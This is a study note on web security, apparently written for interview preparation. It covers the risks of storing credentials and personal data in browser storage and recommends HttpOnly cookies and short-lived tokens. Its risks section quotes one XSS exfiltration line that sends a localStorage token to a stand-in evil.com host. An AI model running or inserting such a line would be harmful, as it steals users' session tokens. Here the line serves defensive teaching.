> Concept: Storing sensitive data on client storage

Storing sensitive data on storage is not safe at all. Try to store it in server. Thats the first measure. But if now way, then store in client but with some remedies.

---

1. Overview & Core Concepts

> What does ‚Äústoring sensitive data on client storage‚Äù mean?

It refers to persisting data in the user‚Äôs browser that could cause harm if exposed, modified, or stolen.

Sensitive data includes:

* Auth credentials (JWTs, session IDs, refresh tokens)
* PII (email, phone, address) [Personally Identifiable Information]
* Financial or health data
* Internal feature flags or entitlements

-

> Why this matters in modern frontend apps:

Modern SPAs and PWAs:

* Rely heavily on client-side state
* Run large amounts of logic in the browser
* Are exposed to XSS, CSRF, and supply-chain attacks

üëâ In interviews, the key insight:

> The browser is an untrusted environment. Anything stored there must be assumed readable and modifiable by the user or an attacker.

Core browser storage mechanisms

| Mechanism      | Accessible by JS | Sent to Server | Typical Use     |
| -------------- | ---------------- | -------------- | --------------- |
| Cookies        | ‚ö†Ô∏è Optional      | ‚úÖ Yes          | Sessions        |
| localStorage   | ‚úÖ Yes            | ‚ùå No           | Preferences     |
| sessionStorage | ‚úÖ Yes            | ‚ùå No           | Temp UI state   |
| IndexedDB      | ‚úÖ Yes            | ‚ùå No           | Offline data    |
| Cache API      | ‚ö†Ô∏è Indirect      | ‚ùå No           | Network caching |

---

2. Available Options & Trade-offs

> Cookies

Pros:
* Automatically sent with HTTP requests
* Can be protected with HttpOnly, Secure, SameSite
* Best option for auth sessions

Cons:
* Size limit (~4KB)
* Vulnerable if misconfigured
* Third-party cookies increasingly restricted

Use for:
‚úî Session identifiers
‚ùå PII payloads

---

localStorage

Pros:
* Simple API
* Persistent across sessions
* Large (~5‚Äì10MB)

Cons:
* Fully accessible via JS
* No expiration
* Vulnerable to XSS

Use for:
‚úî Non-sensitive preferences
‚ùå Auth tokens, PII

---

> sessionStorage

Pros:
* Tab-scoped
* Cleared on tab close

Cons:
* Still JS-accessible
* No cross-tab sharing

Use for:
‚úî Temporary UI state
‚ùå Secrets

---

> IndexedDB

Pros:
* Large storage
* Structured data
* Async (non-blocking)

Cons:
* Complex API
* Still vulnerable to XSS
* Harder to inspect but not secure

Use for:
‚úî Offline caches
‚ùå Sensitive user data

---

3. Security Considerations & Risks

Core principle

> Client-side storage provides ZERO confidentiality guarantees.

- Major vulnerabilities:
* XSS ‚Üí attacker reads localStorage, IndexedDB
* Malicious extensions ‚Üí read all storage
* Shared devices ‚Üí persistent data leakage
* Replay attacks ‚Üí stolen tokens reused

- Why localStorage is dangerous for auth
// ‚ùå Common but insecure
localStorage.setItem("token", jwt);


- If XSS occurs:
fetch("https://evil.com/steal?token=" + localStorage.token);

--

Real-world consequences

* Account takeovers
* Silent long-lived breaches
* Regulatory violations (GDPR fines)

---

4. Best Practices & Secure Design Patterns

Golden rules (interview gold)

1. Never store secrets client-side
2. Prefer server-managed sessions
3. Assume XSS will happen

---

5. Recommended auth pattern (FAANG standard)

1. HttpOnly session cookies
2. Short lived data
3. Encryption

--

- HttpOnly session cookies
Set-Cookie: session_id=abc123;
  HttpOnly;
  Secure;
  SameSite=Lax;


Why this works

* JS cannot read it
* Sent automatically
* Mitigates token exfiltration

---

- If tokens must exist client-side

*(e.g., mobile web, some BFF architectures)*

Mitigations
* Short-lived access tokens (using setTimeout)
* Rotation via refresh tokens
* In-memory storage only
* Strong CSP headers




---

Encrypting client-side data

‚ö†Ô∏è Encryption does NOT make storage secure
Keys must live somewhere ‚Üí attacker can extract them.

Use encryption only for:

* Casual data protection
* Obfuscation against non-technical access

-